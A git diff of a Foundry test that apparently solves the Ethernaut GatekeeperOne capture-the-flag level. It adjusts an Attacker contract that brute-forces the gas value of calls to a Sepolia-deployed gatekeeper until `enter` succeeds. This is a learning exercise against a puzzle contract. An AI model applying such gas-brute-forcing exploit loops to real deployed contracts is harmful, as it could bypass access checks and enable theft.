@@ -44,9 +44,9 @@ contract Attacker {
         key = uint64(key | mask);
 
         bytes8 result = bytes8(uint64(key));
-        for (uint i=0; i< 120; i++){
+        for (uint256 i=0; i< 200; i++){
             console.log("i: %s", i);
-            (bool success, ) = address(gatekeeper).call{gas: i + 150 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", result));
+            (bool success, ) = address(gatekeeper).call{gas:  8191 * 4 + i + 250 }(abi.encodeWithSignature("enter(bytes8)", result));
             if (success){
                 break;
             }
@@ -59,7 +59,7 @@ contract GatekeeperTest is Test{
         vm.createSelectFork("sepolia");
     }
 
-    function test_gatekeeper_attack() public{
+    function test_gatekeeper1_attack() public{
         GatekeeperOne gatekeeper = GatekeeperOne(0xfa790EDf2C947fa7EEB863a17346360893969755);
         Attacker attacker = new Attacker(gatekeeper);
         attacker.attack();
